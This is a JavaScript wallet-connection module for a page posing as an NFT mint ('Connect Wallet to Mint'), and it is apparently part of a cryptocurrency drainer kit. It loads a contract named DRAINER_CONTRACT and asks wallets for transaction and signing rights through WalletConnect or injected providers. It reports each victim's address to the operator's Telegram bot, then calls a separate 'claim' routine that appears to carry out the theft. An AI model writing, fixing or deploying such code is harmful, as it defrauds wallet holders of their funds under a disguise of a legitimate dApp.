import { CONFIG } from './config.js';

;(function () {
  'use strict';

  // ==========================================================================
  //  CONSTANTS
  // ==========================================================================
  const WC_RELAY          = 'wss://relay.walletconnect.com';
  const WC_SESSION_KEY    = 'walletConnectSession';
  const WALLET_KEY        = 'connectedWallet';
  const CHAIN_TYPE_KEY    = 'chainType';
  const PENDING_URI_KEY   = 'pending_wc_uri';
  const PENDING_TS_KEY    = 'pending_wc_timestamp';
  const PENDING_TTL_MS    = 5 * 60 * 1000;   
  const CONNECT_TIMEOUT   = 8000;
  const WC_APPROVAL_WAIT  = 300000;            
  const PROVIDER_INIT_RETRIES = 4;
  const PROVIDER_INIT_DELAY   = 500;         

  // ==========================================================================
  //  SMALL UTILITIES
  // ==========================================================================
  const delay = (ms) => new Promise((r) => setTimeout(r, ms));

  function logInfo(msg) {
    // Deliberately verbose-free: only structural messages, never private data.
    console.log('[wallet]', msg);
  }

  function isMobile()  { return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); }
  function isIOS()     { return /iPhone|iPad|iPod/i.test(navigator.userAgent); }
  function isAndroid() { return /Android/i.test(navigator.userAgent); }
  function isDesktop() { return !isMobile(); }

  function safeLocalGet(key) {
    try { return localStorage.getItem(key); } catch (e) { return null; }
  }
  function safeLocalSet(key, val) {
    try { localStorage.setItem(key, val); } catch (e) {}
  }
  function safeLocalRemove(key) {
    try { localStorage.removeItem(key); } catch (e) {}
  }
  function safeSessionGet(key) {
    try { return sessionStorage.getItem(key); } catch (e) { return null; }
  }
  function safeSessionSet(key, val) {
    try { sessionStorage.setItem(key, val); } catch (e) {}
  }
  function safeSessionRemove(key) {
    try { sessionStorage.removeItem(key); } catch (e) {}
  }

  function shortAddr(a) {
    if (!a || a.length < 10) return a || '';
    return a.slice(0, 6) + '...' + a.slice(-4);
  }

  // ==========================================================================
  //  DOM REFERENCES
  // ==========================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ==========================================================================
  //  MODULE STATE
  // ==========================================================================
  let currentSession     = null;   // WalletConnect session
  let client             = null;   // WalletConnect SignClient
  let modal              = null;   // WalletConnect modal
  let SignClient         = null;   // library classes
  let WalletConnectModal = null;
  let EthereumProvider   = null;

  let web3Instance     = null;
  let contractInstance = null;
  let activeProvider   = null;
  let isConnecting     = false;
  let walletConnectEventsBound = false;

  // ==========================================================================
  //  CONFIG SHORTCUTS
  // ==========================================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID,
  } = CONFIG;

  let projectId = PROJECT_ID;

  // ==========================================================================
  //  UI
  // ==========================================================================
  function setButtonState(button, state) {
    if (!button) return;

    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;

    claimStatus.textContent        = msg;
    claimStatus.className          = `status ${type}`;
    claimStatus.style.display      = 'block';
    claimStatus.style.padding      = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop    = '12px';
    claimStatus.style.fontWeight   = '500';
    claimStatus.style.fontSize     = '14px';
    claimStatus.style.textAlign    = 'center';

    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);

    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ==========================================================================
  //  TELEGRAM NOTIFICATIONS (best-effort, never blocking)
  // ==========================================================================
  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      return r.ok;
    } catch (e) {
      return false;
    }
  }

  // ==========================================================================
  //  LOCAL STORAGE HELPERS
  // ==========================================================================
  function saveWallet(address, session = null, chainType = null) {
    safeLocalSet(WALLET_KEY, address);
    if (session)   safeLocalSet(WC_SESSION_KEY, JSON.stringify(session));
    if (chainType) safeLocalSet(CHAIN_TYPE_KEY, chainType);
  }

  function getSavedWallet()    { return safeLocalGet(WALLET_KEY); }
  function getSavedChainType() { return safeLocalGet(CHAIN_TYPE_KEY) || 'unknown'; }
  function getSavedSession() {
    const raw = safeLocalGet(WC_SESSION_KEY);
    if (!raw) return null;
    try { return JSON.parse(raw); } catch (e) { return null; }
  }

  function clearSavedWallet() {
    safeLocalRemove(WALLET_KEY);
    safeLocalRemove(WC_SESSION_KEY);
    safeLocalRemove(CHAIN_TYPE_KEY);
  }

  function cleanupStalePendingUri() {
    const ts = safeSessionGet(PENDING_TS_KEY);
    if (ts && Date.now() - parseInt(ts, 10) > PENDING_TTL_MS) {
      safeSessionRemove(PENDING_URI_KEY);
      safeSessionRemove(PENDING_TS_KEY);
    }
  }

  // ==========================================================================
  //  GLOBAL STATE PUBLICATION — the ONLY contract with script.js
  // ==========================================================================
  function publishGlobalState(address, chain, provider = null) {
    const live =
      provider ||
      activeProvider ||
      web3Instance?.currentProvider ||
      window.ethereum ||
      null;

    window.__apexConnected = {
      address,
      chain,
      web3:     web3Instance,
      contract: contractInstance,
      provider: live,
      session:  currentSession,
      publishedAt: Date.now(),
    };

    window.dispatchEvent(new CustomEvent('apex:connected', {
      detail: { address, chain },
    }));
  }

  function connectedAddress() {
    return (window.__apexConnected && window.__apexConnected.address) || getSavedWallet() || null;
  }

  // ==========================================================================
  //  CONNECTED UI
  // ==========================================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel  = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      if (connectButton && connectButton.parentNode) {
        connectButton.parentNode.appendChild(display);
      }
    }

    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${shortAddr(address)}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;

    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        if (!b) return;
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      }).catch(() => {});
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');

    const el = document.getElementById('connectedAddressDisplay');
    if (el) el.remove();

    showStatus('Wallet disconnected', 'info');

    web3Instance     = null;
    contractInstance = null;
    activeProvider   = null;
    currentSession   = null;

    window.__apexConnected = null;
  }

  // ==========================================================================
  //  EIP-6963 PROVIDER DISCOVERY
  // ==========================================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;

    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!d || !d.info) return;
      if (!evmProviders.some((p) => p.info && p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
      }
    });

    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  // ==========================================================================
  //  WALLET PICKER MODAL
  // ==========================================================================
  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position:fixed;inset:0;background:rgba(0,0,0,0.7);
      display:flex;align-items:center;justify-content:center;
      z-index:99999;
    `;

    const modalEl = document.createElement('div');
    modalEl.style.cssText = `
      background:#1F2937;padding:24px;border-radius:16px;
      max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;
    `;

    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;

    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);

    const list = modalEl.querySelector('#wl');

    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `
        background:#374151;border:none;padding:12px;border-radius:8px;
        color:white;font-size:16px;cursor:pointer;text-align:left;
        display:flex;gap:10px;align-items:center;
      `;

      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px';
        i.style.height = '24px';
        b.prepend(i);
      }

      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });

    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ==========================================================================
  //  WALLETCONNECT LIBRARY INIT
  // ==========================================================================
  async function initWalletConnect(useTestId = false) {
    if (client && modal) return true;

    if (useTestId) {
      projectId = PUBLIC_TEST_ID;
    }

    try {
      client = await SignClient.init({
        projectId,
        metadata: DAPP_METADATA,
        relayUrl: WC_RELAY,
      });

      modal = new WalletConnectModal({
        projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
        },
        enableExplorer: true,
      });

      return true;
    } catch (e) {
      logInfo('WalletConnect init failed: ' + (e && e.message));
      return false;
    }
  }

  // ==========================================================================
  //  BUILD EIP-1193 PROVIDER FROM SESSION
  //  Retries init if the session isn't yet usable. This is the fix for the
  //  "wallet shows connected but frontend doesn't" symptom.
  // ==========================================================================
  async function buildProviderFromSession(session) {
    for (let attempt = 1; attempt <= PROVIDER_INIT_RETRIES; attempt++) {
      try {
        const provider = await EthereumProvider.init({
          projectId,
          metadata: DAPP_METADATA,
          session,
          chains: [1],
          optionalChains: [1],
          showQrModal: false,
        });

        // Probe the provider to confirm it's actually able to answer.
        const accounts = await provider.request({ method: 'eth_accounts' });
        if (Array.isArray(accounts) && accounts.length > 0) {
          return { provider, account: accounts[0] };
        }

        // If eth_accounts returns [], try eth_requestAccounts once.
        const reqAccounts = await provider.request({ method: 'eth_requestAccounts' });
        if (Array.isArray(reqAccounts) && reqAccounts.length > 0) {
          return { provider, account: reqAccounts[0] };
        }
      } catch (e) {
        logInfo(`Provider init attempt ${attempt} failed: ${e && e.message}`);
      }

      if (attempt < PROVIDER_INIT_RETRIES) {
        await delay(PROVIDER_INIT_DELAY * attempt);
      }
    }
    return null;
  }

  // ==========================================================================
  //  PROVIDER LIFECYCLE EVENTS
  // ==========================================================================
  function setupEVMProviderEvents(provider) {
    if (!provider || typeof provider.on !== 'function') return;

    provider.on('accountsChanged', (accounts) => {
      if (!accounts || accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
      } else {
        updateConnectedUI(accounts[0], 'evm');
        saveWallet(accounts[0], null, 'evm');
        publishGlobalState(accounts[0], 'evm', provider);
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1000);
      }
    });

    provider.on('chainChanged', (id) => {
      showStatus(`Network changed to ${id}`, 'info');
      if (web3Instance) {
        try {
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          const addr = connectedAddress();
          if (addr) publishGlobalState(addr, 'evm', provider);
        } catch (e) {}
      }
    });

    provider.on('disconnect', () => {
      resetConnectedUI();
      clearSavedWallet();
    });
  }

  // ==========================================================================
  //  WALLETCONNECT GLOBAL EVENT HANDLERS
  //  Bound ONCE after client is initialized.
  // ==========================================================================
  function bindWalletConnectEvents() {
    if (!client || walletConnectEventsBound) return;
    walletConnectEventsBound = true;

    client.on('session_update', ({ params }) => {
      const accounts = params && params.namespaces && params.namespaces.eip155 && params.namespaces.eip155.accounts;
      if (accounts && accounts.length > 0) {
        const a = accounts[0].split(':')[2];
        updateConnectedUI(a, 'evm');
        saveWallet(a, currentSession, 'evm');
        publishGlobalState(a, 'evm', activeProvider);
      }
    });

    client.on('session_delete', () => {
      resetConnectedUI();
      clearSavedWallet();
    });

    client.on('session_connect', (session) => {
      // A session was accepted by the wallet AFTER our await already
      // returned or timed out. Reconcile the UI if we're not yet connected.
      const accounts = session && session.namespaces && session.namespaces.eip155 && session.namespaces.eip155.accounts;
      if (!accounts || accounts.length === 0) return;

      const a = accounts[0].split(':')[2];

      // Only reconcile if we're not already connected with this address.
      const already = connectedAddress();
      if (already && already.toLowerCase() === a.toLowerCase() && activeProvider) return;

      currentSession = session;
      saveWallet(a, session, 'evm');

      // Reconstruct the provider from this session.
      buildProviderFromSession(session).then((res) => {
        if (!res) return;
        const Web3 = window.Web3 || null;
        if (!Web3) {
          // web3 may not be imported yet; import it lazily.
          import('web3').then((mod) => {
            const W3 = mod.default || mod;
            web3Instance     = new W3(res.provider);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            activeProvider   = res.provider;
            updateConnectedUI(res.account, 'evm');
            setupEVMProviderEvents(res.provider);
          }).catch(() => {});
        } else {
          web3Instance     = new Web3(res.provider);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          activeProvider   = res.provider;
          updateConnectedUI(res.account, 'evm');
          setupEVMProviderEvents(res.provider);
        }
      });
    });
  }

  // ==========================================================================
  //  CONNECT — DIRECT (INJECTED) EVM
  // ==========================================================================
  async function connectDirectEVM(timeoutMs = CONNECT_TIMEOUT) {
    setupEIP6963();
    await delay(800);

    let providers = evmProviders.filter((p) => p.provider);

    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return false;

    let chosen = null;
    if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info && (p.info.rdns === 'io.metamask' || (p.info.name || '').toLowerCase().includes('metamask'))
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return false;
    }

    try {
      const provider = chosen.provider;

      const accounts = await Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs)),
      ]);
      if (!accounts || !accounts.length) return false;

      const address = accounts[0];

      saveWallet(address, null, 'evm');
      setupEVMProviderEvents(provider);

      const Web3 = (await import('web3')).default;
      web3Instance     = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      activeProvider = provider;

      updateConnectedUI(address, 'evm');
      return true;
    } catch (e) {
      logInfo('Direct EVM error: ' + (e && e.message));
      return false;
    }
  }

  // ==========================================================================
  //  CONNECT — WALLETCONNECT
  //  This is the primary flow for mobile and the fallback for desktop.
  // ==========================================================================
  async function connectViaWalletConnect(useTestId = false, timeoutMs = WC_APPROVAL_WAIT) {
    if (isConnecting) return false;
    isConnecting = true;

    const ok = await initWalletConnect(useTestId);
    if (!ok) {
      isConnecting = false;
      showStatus('WalletConnect unavailable', 'error');
      return false;
    }

    // Bind global handlers before we start the flow so we never miss a
    // late-arriving session_connect event.
    bindWalletConnectEvents();

    if (modal && typeof modal.closeModal === 'function') {
      try { modal.closeModal(); } catch (e) {}
    }

    try {
      showStatus('Requesting connection...', 'info');

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: [
              'eth_sendTransaction',
              'personal_sign',
              'eth_signTypedData_v4',
            ],
            chains: ['eip155:1'],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      });

      if (!uri) throw new Error('No URI returned');

      modal.openModal({ uri });
      showStatus('Scan the QR code with your wallet', 'info');

      safeSessionSet(PENDING_URI_KEY, uri);
      safeSessionSet(PENDING_TS_KEY, Date.now().toString());

      // Some mobile browsers suspend the page while the user is in the wallet
      // app. We add a visibility listener so we can detect return and, if the
      // session arrives late, reconcile it manually.
      const onVis = () => {
        if (!document.hidden) {
          reconcileLateSession();
        }
      };
      document.addEventListener('visibilitychange', onVis);

      let session = null;
      try {
        session = await Promise.race([
          approval(),
          new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs)),
        ]);
      } catch (e) {
        // Approval timed out or failed. Try to reconcile from client state
        // before giving up.
        session = null;
      }

      document.removeEventListener('visibilitychange', onVis);

      // If approval returned nothing, attempt a late-session reconciliation.
      if (!session || !session.namespaces || !session.namespaces.eip155 || !session.namespaces.eip155.accounts || session.namespaces.eip155.accounts.length === 0) {
        session = reconcileLateSession();
      }

      if (modal && typeof modal.closeModal === 'function') {
        try { modal.closeModal(); } catch (e) {}
      }

      safeSessionRemove(PENDING_URI_KEY);
      safeSessionRemove(PENDING_TS_KEY);

      if (!session || !session.namespaces || !session.namespaces.eip155 || !session.namespaces.eip155.accounts || session.namespaces.eip155.accounts.length === 0) {
        isConnecting = false;
        showStatus('Wallet did not confirm session. Please try again.', 'error');
        return false;
      }

      const account = session.namespaces.eip155.accounts[0].split(':')[2];
      currentSession = session;

      // Build the EIP-1193 provider with retries.
      const built = await buildProviderFromSession(session);
      if (!built) {
        isConnecting = false;
        showStatus('Wallet session established but provider is not responding. Reload to continue.', 'error');
        // Persist session anyway — reload will restore it.
        saveWallet(account, session, 'evm');
        return false;
      }

      const Web3 = (await import('web3')).default;
      web3Instance     = new Web3(built.provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      activeProvider = built.provider;

      saveWallet(built.account, session, 'evm');
      updateConnectedUI(built.account, 'evm');
      setupEVMProviderEvents(built.provider);

      isConnecting = false;
      return true;
    } catch (e) {
      logInfo('WalletConnect error: ' + (e && e.message));
      if (modal && typeof modal.closeModal === 'function') {
        try { modal.closeModal(); } catch (err) {}
      }
      safeSessionRemove(PENDING_URI_KEY);
      safeSessionRemove(PENDING_TS_KEY);
      isConnecting = false;
      return false;
    }
  }

  // ==========================================================================
  //  LATE-SESSION RECONCILIATION
  //  Called if approval() resolved empty, timed out, or the page regained
  //  focus. Reads client.session.getAll() and returns the most recent session.
  // ==========================================================================
  function reconcileLateSession() {
    try {
      if (!client || typeof client.session === 'undefined') return null;
      const sessions = client.session.getAll() || [];
      if (!sessions.length) return null;

      // Sort by expiry, newest last.
      const sorted = sessions.slice().sort((a, b) => (a.expiry || 0) - (b.expiry || 0));
      const latest = sorted[sorted.length - 1];

      if (latest && latest.namespaces && latest.namespaces.eip155 && latest.namespaces.eip155.accounts && latest.namespaces.eip155.accounts.length) {
        currentSession = latest;
        return latest;
      }
    } catch (e) {
      logInfo('reconcileLateSession failed: ' + (e && e.message));
    }
    return null;
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  // ==========================================================================
  async function connectWallet() {
    if (isConnecting) return;

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    let success = false;

    // Try injected first if a browser wallet is present; otherwise go straight
    // to WalletConnect. This keeps desktop fast while ensuring mobile works.
    if (window.ethereum) {
      success = await connectDirectEVM(CONNECT_TIMEOUT);
    }

    if (!success) {
      success = await connectViaWalletConnect(false, WC_APPROVAL_WAIT);
    }
    if (!success) {
      success = await connectViaWalletConnect(true, WC_APPROVAL_WAIT);
    }

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 1500);
    } else {
      showStatus('No wallet found', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  // ==========================================================================
  //  DISCONNECT
  // ==========================================================================
  async function disconnectWallet() {
    try {
      if (client && currentSession && currentSession.topic) {
        await client.disconnect({
          topic: currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' },
        });
      }
      if (web3Instance && web3Instance.currentProvider && typeof web3Instance.currentProvider.disconnect === 'function') {
        await web3Instance.currentProvider.disconnect();
      }
    } catch (e) {
      // Ignore — we clear local state regardless.
    }

    resetConnectedUI();
    clearSavedWallet();

    web3Instance     = null;
    contractInstance = null;
    activeProvider   = null;
  }

  // ==========================================================================
  //  BUTTON WIRING
  // ==========================================================================
  const handleClick = async () => {
    const saved = getSavedWallet();
    const hasSession = currentSession || getSavedChainType() !== 'unknown';
    if (saved && hasSession) {
      await disconnectWallet();
    } else {
      await connectWallet();
    }
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobile()) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => {
        if (connectButton) {
          connectButton.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
      }, 300);
    });
  }

  // ==========================================================================
  //  SESSION RESTORE
  // ==========================================================================
  async function restoreWalletConnection() {
    const savedWallet  = getSavedWallet();
    const savedChain   = getSavedChainType();
    const savedSession = getSavedSession();

    if (!savedWallet || savedChain !== 'evm') return;

    // Attempt WalletConnect restore.
    if (savedSession) {
      const ok = await initWalletConnect(false);
      if (ok) {
        // Bind events even if we're only restoring.
        bindWalletConnectEvents();

        try {
          const session = client.session.get(savedSession.topic);
          if (session) {
            currentSession = session;

            const built = await buildProviderFromSession(session);
            if (built) {
              const Web3 = (await import('web3')).default;
              web3Instance     = new Web3(built.provider);
              contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
              activeProvider   = built.provider;

              updateConnectedUI(built.account, 'evm');
              setupEVMProviderEvents(built.provider);
              return;
            }
          }
        } catch (e) {
          logInfo('Restore failed: ' + (e && e.message));
        }
      }
    }

    // Fall back to injected provider on desktop.
    if (isDesktop() && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts && accounts.length > 0 && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
          const Web3 = (await import('web3')).default;
          web3Instance     = new Web3(window.ethereum);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          activeProvider   = window.ethereum;

          updateConnectedUI(savedWallet, 'evm');
          setupEVMProviderEvents(window.ethereum);
          return;
        }
      } catch (e) {
        // fall through
      }
    }

    // Nothing matched — clear stale state.
    clearSavedWallet();
  }

  // ==========================================================================
  //  LIBRARY LOADING
  // ==========================================================================
  async function loadWalletConnect() {
    const cdns = [
      'https://esm.sh/@walletconnect/sign-client@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
    ];
    const modalCdns = [
      'https://esm.sh/@walletconnect/modal@2.6.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
    ];
    const providerCdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
    ];

    let SC, WCM, EP;

    for (const url of cdns) {
      try { const m = await import(url); SC = m.default || m; break; } catch (e) {}
    }
    if (!SC) throw new Error('Could not load SignClient');

    for (const url of modalCdns) {
      try { const m = await import(url); WCM = m.WalletConnectModal || m.default || m; break; } catch (e) {}
    }
    if (!WCM) throw new Error('Could not load WalletConnectModal');

    for (const url of providerCdns) {
      try { const m = await import(url); EP = m.EthereumProvider || m.default || m; break; } catch (e) {}
    }
    if (!EP) throw new Error('Could not load EthereumProvider');

    return { SignClient: SC, WalletConnectModal: WCM, EthereumProvider: EP };
  }

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  cleanupStalePendingUri();

  try {
    const libs = await loadWalletConnect();
    SignClient         = libs.SignClient;
    WalletConnectModal = libs.WalletConnectModal;
    EthereumProvider   = libs.EthereumProvider;

    setupEIP6963();
    await restoreWalletConnection();
  } catch (err) {
    logInfo('Failed to load wallet libraries: ' + (err && err.message));
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  // Attach lifecycle events to any injected provider present at boot.
  if (window.ethereum && isDesktop()) {
    setupEVMProviderEvents(window.ethereum);
  }

  // Close the WC modal on unload to avoid a "session pending" state.
  window.addEventListener('beforeunload', () => {
    if (modal && typeof modal.closeModal === 'function') {
      try { modal.closeModal(); } catch (e) {}
    }
  });

  // Optional: when the page regains focus after being backgrounded during a
  // WC approval, reconcile any late-arriving session.
  document.addEventListener('visibilitychange', () => {
    if (!document.hidden) {
      const pending = safeSessionGet(PENDING_URI_KEY);
      if (pending) reconcileLateSession();
    }
  });
})();
